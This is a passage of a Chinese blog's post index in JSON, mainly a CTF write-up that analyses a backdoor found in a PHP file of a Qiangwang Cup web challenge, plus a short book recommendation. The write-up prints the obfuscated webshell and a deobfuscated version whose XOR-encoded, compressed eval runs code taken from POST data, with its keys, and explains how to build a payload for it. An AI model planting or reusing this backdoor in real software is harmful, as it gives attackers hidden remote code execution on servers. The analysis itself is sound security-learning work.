游戏体检很差，被疯狂暴打","categories":[],"tags":[]},{"title":"广东省强网杯线下赛web1后门分析","slug":"qwb_web1","date":"2019-09-24T21:46:25.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2019/09/24/qwb_web1/","link":"","permalink":"https://p7e4.js.org/2019/09/24/qwb_web1/","excerpt":"","text":"源码下载地址https://github.com/p7e4/qwb_web/raw/master/www1.zipD盾扫一下很快可以发现/inc/conn.php有一个后门了 123456789101112&lt;?php$o='n();$r=@bas&#125;&gt;&#125;&gt;e64_encode(@x(&#125;&gt;@gzc&#125;&gt;o&#125;&gt;mpress($o),$&#125;&gt;k));p&#125;&gt;rint(\"&#125;&gt;$p$kh&#125;&gt;$r$kf\");&#125;';$g='&gt;EgwZ7H&#125;&gt;iEecl&#125;&gt;S\";function &#125;&gt;x($t,$&#125;&gt;k)&#123;$&#125;&gt;&#125;&gt;c=s&#125;&gt;trlen(&#125;&gt;$k)&#125;&gt;;$l=strlen($t);$o=\"';$l='\";&#125;&gt;f&#125;&gt;or($i=0;$&#125;&gt;&#125;&gt;i&lt;$l;)&#123;for($&#125;&gt;j=&#125;&gt;0;&#125;&gt;&#125;&gt;($j&lt;$c&amp;&amp;$i&lt;$l&#125;&gt;);$j++,$i++)&#123;$o.&#125;&gt;&#125;&gt;=$';$r='_contents&#125;&gt;(\"p&#125;&gt;&#125;&gt;hp://i&#125;&gt;nput\")&#125;&gt;,$m)==1)&#123;@ob_star&#125;&gt;t(&#125;&gt;);@&#125;&gt;eva&#125;&gt;l(@gzu&#125;&gt;ncompress(';$L='$k=\"5ac&#125;&gt;91f7&#125;&gt;d\";$&#125;&gt;kh=&#125;&gt;&#125;&gt;\"b9615a29&#125;&gt;bc1d\";&#125;&gt;$kf=\"24d0b67&#125;&gt;c2c91\";$p&#125;&gt;=\"9GmI&#125;&gt;&#125;';$s=str_replace('C','','cCreaCteC_fCuCCnction');$Z='t&#123;$i&#125;^&#125;&gt;$k&#123;$&#125;&gt;j&#125;&gt;&#125;;&#125;&#125;ret&#125;&gt;urn $o;&#125;&#125;&gt;if(@preg_match&#125;&gt;&#125;&gt;(\"&#125;&gt;/$kh(.+&#125;&gt;)$kf&#125;&gt;/\",@file_&#125;&gt;get';$h='@x(@ba&#125;&gt;se64&#125;&gt;_d&#125;&gt;ecode($m[1])&#125;&gt;,$&#125;&gt;&#125;&gt;k)))&#125;&gt;;&#125;&gt;$o=@&#125;&gt;ob_get_contents();@ob_&#125;&gt;en&#125;&gt;d_cl&#125;&gt;ea';$q=str_replace('&#125;&gt;','',$L.$g.$l.$Z.$r.$h.$o);$I=$s('',$q);$I();?&gt; 把$s输出发现是create_function所以后面$I=$s(&#39;&#39;,$q);$I();就是是创建了一个匿名函数，然后调用该函数，即执行$q中的代码再输出$q并格式化一下，代码如下 123456789101112131415161718192021222324$k=\"5ac91f7d\";$kh=\"b9615a29bc1d\";$kf=\"24d0b67c2c91\";$p=\"9GmIEgwZ7HiEeclS\";function x($t,$k) &#123; $c = strlen($k); $l = strlen($t); $o = \"\"; for ($i=0;$i&lt;$l;) &#123; for($j=0; ($j&lt;$c &amp;&amp; $i&lt;$l); $j++, $i++)&#123; $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;; &#125; &#125; return $o;&#125;if (preg_match(\"/$kh(.+)$kf/\",file_get_contents(\"php://input\"),$m)==1) &#123; ob_start(); eval(gzuncompress(x(base64_decode($m[1]),$k))); $o = ob_get_contents(); ob_end_clean(); $r = base64_encode(x(gzcompress($o),$k)); print(\"$p$kh$r$kf\");&#125; x这个函数就是按$k长度把原字符串分组再和$k逐位进行一异或再调用一次就能还原了（当时脑子给空调吹坏了，居然没反应过来）不用看文档也大概猜的出gzuncompress和gzcompress是成对的，用于字符串压缩等第17行的preg_match(&quot;/$kh(.+)$kf/&quot;,file_get_contents(&quot;php://input&quot;),$m)==1是用正则从POST的内容中提取出以$kh开头和$kf结尾的中间字符串赋给$m变量 那么最终的payload构造其实很简单先base64编码一下然后用x函数异或再gzcompress压缩一下即可（结果是不可打印字符，这里就不贴了） 结果反着来解即先base64_decode再x再gzuncompress即可","categories":[],"tags":[]},{"title":"推荐一本CTF书","slug":"Hello","date":"2019-09-08T20:46:25.000Z","updated":"2020-08-12T13:32:33.978Z","comments":true,"path":"2019/09/08/Hello/","link":"","permalink":"https://p7e4.js.org/2019/09/08/Hello/","excerpt":"","text":"分享一本CTF书——“与其相信谣言，不如一直学习。” GitHub 地址：https://github.com/firmianay/CTF-All-In-One GitBook 地址：https://www.gitbook.com/book/firmianay/ctf-all-in-one/details PDF/Mobi/ePub 文件下载地址： （推荐）https://www.gitbook.com/download/pdf/book/firmianay/ctf-all-in-one（不推荐）https://github.com/firmianay/CTF-All-In-One/releases firmianayCTF-All-In-One 偏重于Pwn，毕竟还是Pwn厉害","categories":[],"tags":[]}],"categories":[],"tags":[]}